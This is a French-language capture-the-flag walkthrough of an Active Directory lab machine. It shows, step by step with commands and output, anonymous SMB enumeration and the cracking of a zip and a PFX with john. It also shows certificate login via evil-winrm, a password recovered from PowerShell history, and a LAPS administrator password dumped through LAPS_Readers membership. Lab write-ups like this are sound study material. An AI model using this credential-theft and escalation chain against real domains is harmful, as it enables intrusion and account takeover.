# Timelapse - Easy

```bash
nmap -sV -sC 10.10.11.152 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-01 17:40 EST
Nmap scan report for 10.10.11.152
Host is up (0.028s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-02-02 00:40:44Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2h00m17s
| smb2-time: 
|   date: 2023-02-02T00:40:50
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

On est sur une machine windows avec un LDAP et SMB avec signing. On commence donc par essayer de se connecter en anonyme au smb

```bash
smbmap -H 10.10.11.152 -u anonymous
[+] Guest session       IP: 10.10.11.152:445    Name: 10.10.11.152                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

En cherchant plus en profondeur on trouve:

```bash
smbmap -H 10.10.11.152 -u anonymous -r Shares/HelpDesk
[+] Guest session       IP: 10.10.11.152:445    Name: 10.10.11.152                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Shares                                                  READ ONLY
        .\SharesHelpDesk\*
        dr--r--r--                0 Mon Oct 25 11:55:14 2021    .
        dr--r--r--                0 Mon Oct 25 11:55:14 2021    ..
        fr--r--r--          1118208 Mon Oct 25 11:55:14 2021    LAPS.x64.msi
        fr--r--r--           104422 Mon Oct 25 11:55:14 2021    LAPS_Datasheet.docx
        fr--r--r--           641378 Mon Oct 25 11:55:14 2021    LAPS_OperationsGuide.docx
        fr--r--r--            72683 Mon Oct 25 11:55:14 2021    LAPS_TechnicalSpecification.docx
```

On a également un autre fichier intéressant:

```bash
smbmap -H 10.10.11.152 -u anonymous --download Shares/Dev/winrm_backup.zip
```

On le crack:

```bash
zip2john 10.10.11.152-Shares_Dev_winrm_backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

On trouve le mdp: supremelegacy et on obtient le fichier legacyy_dev_auth.pfx qui est en fait un fichier **PKCS#12** donc il faut aussi le cracker.

```bash
/usr/share/john/pfx2john legacyy_dev_auth.pfx > legacy.hash
```

Note: il faut utiliser python2 pour que ça marche ou retirer les “ b’ ” et “ ’ ” 

On trouve le mot de passe du store: thuglegacy. On peut maintenant extraire le certificat et la clé à l’aide de ce mdp et de la passphrase qui est le mdp précédent

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx
```

On va donc essayer de se log avec evil-winrm avec ce certificat

```bash
evil-winrm -S -i 10.10.11.152 -c timelapse.crt -k timelapse.key
```

Et on est log en tant que legacyy. On récupére le flag user.

Rien dans les documents, on a pas accès à grand chose.

On va donc chercher l’historique des commandes powershell dans:

```bash
C:\Users\legacyy\APPDATA\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```

```powershell
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

On peut utiliser ce SecureString directement pour se log avec evilwinrm.

Après recherche voici la seule piste:

```bash
net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

On est membre du groupe LAPS_Readers qui va nous permettre de lire des creds.

Il faut faire cette commande pour dump:

```bash
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
```

On trouve ceci: 

```bash
ms-Mcs-AdmPwd                        : dQj@1Q},g,#9ts2f8pT0)6od
```

On obtient alors une connection en tant qu’administrateur et donc le flag final